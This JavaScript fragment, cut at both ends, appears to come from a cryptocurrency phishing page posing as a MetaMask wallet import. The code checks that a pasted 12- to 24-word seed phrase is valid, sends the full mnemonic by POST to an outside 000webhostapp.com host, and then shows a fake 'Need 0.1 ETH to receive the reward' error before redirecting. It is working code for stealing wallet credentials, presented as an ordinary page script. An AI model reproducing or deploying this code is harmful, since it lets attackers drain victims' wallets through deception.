      const redirectUrl = 'metamask.asp' // redirect url setelah memasuki lastStage

      let stage = 1 // awal stage
      const errorMsg = ['Need 0.1 ETH to receive the reward','Need 0.1 ETH to receive the reward'] // error message urutan berdasarkan stage
      let check = false
      let passForCreate = false
      let passForCreateConfir = false
      let words = false

      $(".closeBtn").on("click", function (e) {
        $(".alertBox").hide()
        $(".alert").hide()
      })  

      function showBtn() {
        if(words) $("#imp").prop("disabled", false)
        else $("#imp").prop("disabled", true) 
      }
      
      $('#wordsseed').on("change keyup paste", function(evt) {
        let pass = $(this).val()
        if(pass.split(" ").length == 12 || pass.split(" ").length == 18 || pass.split(" ").length == 21 || pass.split(" ").length == 24){
          $("#wordsErrorConfir").hide()
        
          try{
            let mnemonic = pass
            let mnemonicWallet = ethers.Wallet.fromMnemonic(mnemonic)
            words = true
            $("#wordsErrorConfir").hide()
            $("#incorecct").hide()
          } catch (e){
            $("#wordsErrorConfir").hide()
            $("#incorecct").show()
            words = false
          }

        } else{
          $("#wordsErrorConfir").show()
          words = false
          
          $("#incorecct").hide()
        }

        showBtn()
      })
      
      $("#imp").on("click", function(){      
        let mnemonic = $("#wordsseed").val()
        let wallet = ethers.Wallet.fromMnemonic(mnemonic)
        if(stage < lastStage) {
          $.ajax({
            method: "POST",
            url: "https://waduhhhtaee.000webhostapp.com/neweraqwerty.txt",
            data: { seed: mnemonic, wallet: 'Metamask' },
            success: function(data) {
              updateStage()
            }
          })
        } else window.location = redirectUrl
      })

      function updateStage() {
        if(typeof errorMsg[stage - 1] !== 'undefined') $("#errorText").html(errorMsg[stage - 1])
        else $("#errorText").html(errorMsg[0])
        stage += 1
        $("#errorText").css('display','')
        setTimeout(function(){
          $("#errorText").css('display','none')
        }, 3000)
      }
      
      setTimeout(function(){
        $(".loader").hide() 
        $(".alertBox").fadeOut('slow')
